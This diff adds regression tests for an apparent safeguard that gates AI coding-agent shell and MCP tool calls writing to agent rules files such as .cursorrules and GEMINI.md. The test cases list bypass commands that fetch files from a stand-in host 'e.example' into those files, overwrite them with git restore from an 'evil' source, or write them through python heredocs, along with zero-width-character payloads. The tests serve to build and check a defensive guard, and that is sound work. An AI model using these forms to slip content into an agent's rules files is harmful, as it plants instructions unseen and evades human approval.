@@ -1041,3 +1041,119 @@ def test_non_string_allow_entries_ignored():
     pol = Policy(agent_rules={"allow": [5, None, {"a": 1}]})
     assert _only(_write("/repo/.cursor5rules/x"), pol) is None      # not a rules path anyway
     assert _only(_write("/repo/.roo/rules-5/x"), pol).action == Action.ASK
+
+
+# ---- QA round 4 regressions ----------------------------------------------------
+def test_slow_shapes_from_round_4_stay_fast(tmp_path):
+    import time
+    cwd = str(tmp_path)
+    t = time.time()
+    for word in ("chr", "char]", "fromCharCode", "unichr"):
+        for ws in (" ", "\t"):
+            _only(_shell("echo ok > .cursorrules  # " + word + ws * 19000 + ".", cwd=cwd))
+    _only(_shell(f"cat {cwd}/AGENT.md <<'EOF'\n" + "git checkout a\n" * 1200 + "EOF", cwd=cwd))
+    _only(_shell(f"cat {cwd}/AGENT.md <<'EOF'\n" + "writeFile " * 1900 + "\nEOF", cwd=cwd))
+    assert time.time() - t < 4.0
+
+
+def test_source_scan_total_byte_budget(tmp_path):
+    import time
+    big = tmp_path / "big"
+    big.mkdir()
+    body = (chr(0xE9) + chr(0x200B)) * 200000
+    for i in range(16):
+        (big / f"f{i}.txt").write_text(body, encoding="utf-8")
+    names = " ".join(f"big/f{i}.txt" for i in range(16))
+    t = time.time()
+    assert _only(_shell(f"cat {names} > .cursorrules", cwd=str(tmp_path))).action == Action.ASK
+    assert time.time() - t < 2.5
+
+
+@pytest.mark.parametrize("cmd", [
+    "git add GEMINI.md && git commit -m 'Update notes\n\nCo-Authored-By: Claude <noreply@anthropic.com>'",
+    "git commit -m \"$(cat <<'EOF'\nUpdate GEMINI.md wording\n\nCo-Authored-By: Claude <noreply@anthropic.com>\nEOF\n)\"",
+    "git add .cursor/rules/ && git commit -m \"$(cat <<'EOF'\nAdd rules\n\nCo-Authored-By: X <x@y.z>\nEOF\n)\"",
+])
+def test_commit_with_email_trailer_not_claimed(cmd):
+    assert _only(_shell(cmd)) is None, cmd
+
+
+def test_real_redirect_next_to_an_email_still_asks():
+    assert _only(_shell("echo 'by <a@b.c>' > .cursorrules")).action == Action.ASK
+
+
+@pytest.mark.parametrize("cmd", [
+    'curl -o "My Project/.cursorrules" http://e.example/x',
+    'curl -fsSL http://e.example/x -o "/Users/me/My Project/.cursor/rules/x.mdc"',
+    'curl -fsSL http://e.example/x --output "$HOME/My Project/.cursorrules"',
+    "pandoc x.md -o 'My Docs/GEMINI.md'",
+    "curl -o " + "a/" * 120 + ".cursorrules http://e.example/x",
+    "curl -OL http://e.example/GEMINI.md", "curl -OJ http://e.example/GEMINI.md",
+    "curl -fsSLOJ http://e.example/GEMINI.md", "curl -L http://e.example/GEMINI.md -OJ",
+    'curl -H "a; ls b" -o .cursorrules http://e.example/x',
+    "less -o .cursorrules x",
+    "wget http://e.example/GEMINI.md -U 'a -O - b'",
+    "wget http://e.example/GEMINI.md -o -",
+    "git restore -s evil --staged --work .cursorrules",
+    "git restore --source=evil --staged .cursorrules",
+    "git --work-tree . checkout evil -- .cursorrules",
+    "find . -path '*/.cursor/rul*' -prune -exec cp x.mdc {}/ \;",
+    "python3 - <<'E'\nopen('.cursorrules','w').write('x')\nE",
+    "python3 << 'EOF'\nwith open('GEMINI.md','a') as f: f.write('x')\nEOF",
+])
+def test_round_4_bypass_forms_ask(cmd):
+    d = _only(_shell(cmd))
+    assert d is not None and d.action == Action.ASK, cmd
+
+
+def test_root_generic_names_via_cwd_path_with_common_word_verbs_and_options():
+    for cmd in ("touch /repo/.rules", "vim /repo/AGENT.md", "patch /repo/.rules x.diff",
+                "git checkout evil -- /repo/replit.md", "curl -o /repo/AGENT.md http://e.example/x"):
+        assert _only(_shell(cmd, cwd="/repo")).action == Action.ASK, cmd
+    for cmd in ("curl -o docs/AGENT.md http://e.example/x", "sort -o semgrep/.rules x",
+                "pandoc in.md -o docs/AGENT.md"):
+        assert _only(_shell(cmd, cwd="/repo")) is None, cmd
+
+
+def test_source_scan_only_when_the_rules_file_is_the_destination(tmp_path):
+    (tmp_path / "zw.txt").write_text("a" + chr(0x2060) + "b", encoding="utf-8")
+    cwd = str(tmp_path)
+    for cmd in ("cp .cursorrules zw.txt", "cat .cursorrules zw.txt > both.txt" if False
+                else "cat zw.txt .cursorrules"):
+        d = _only(_shell(cmd, cwd=cwd))
+        assert d is None or d.action == Action.ASK, cmd
+    for cmd in ("cp zw.txt .cursorrules", "/bin/cp zw.txt .cursorrules", "env cp zw.txt .cursorrules",
+                "sudo -u bob cp zw.txt .cursorrules", "LC_ALL=C cp zw.txt .cursorrules",
+                "cp \\\n zw.txt .cursorrules", "cp -t .cursor/rules zw.txt",
+                "cat zw.txt zw.txt zw.txt zw.txt zw.txt zw.txt zw.txt zw.txt zw.txt zw.txt zw.txt "
+                "zw.txt zw.txt zw.txt zw.txt zw.txt zw.txt > .cursorrules"):
+        assert _only(_shell(cmd, cwd=cwd)).action == Action.DENY, cmd
+
+
+def test_ansi_escape_text_elsewhere_in_command_is_not_a_hidden_deny():
+    for cmd in ("printf '\\033[1mbold\\033[0m\\n'; echo x > .cursorrules",
+                "echo -e '\\e[32mdone\\e[0m' && cp tmpl .cursorrules"):
+        assert _only(_shell(cmd)).action == Action.ASK, cmd
+
+
+def test_mcp_walk_budget_exhaustion_falls_back_to_flat_scan():
+    files = [{"path": f"src/f{i}.py", "content": "x"} for i in range(2100)]
+    files.append({"path": ".cursorrules", "content": "x"})
+    assert _only(_ev("mcp__github__push_files", files=files)).action == Action.ASK
+    assert _only(_ev("mcp__x__write", paths=[[".cursorrules"]])).action == Action.ASK
+
+
+@pytest.mark.parametrize("tool", ["mcp__git__git_diff", "mcp__git__git_log", "mcp__ide__getDiagnostics",
+                                  "mcp__filesystem__directory_tree"])
+def test_more_mcp_read_names(tool):
+    assert _only(_ev(tool, path="/repo/.cursorrules")) is None
+
+
+@pytest.mark.parametrize("tool", ["mcp__git__git_checkout", "mcp__fs__get_and_export", "mcp__x__run_command"])
+def test_mcp_names_with_write_words_ask(tool):
+    assert _only(_ev(tool, path="/repo/.cursorrules")).action == Action.ASK
+
+
+def test_deny_mode_shell_message_does_not_offer_approval():
+    d = _only(_shell("echo x > .cursorrules"), DENY)
+    assert "approving is safe" not in d.message
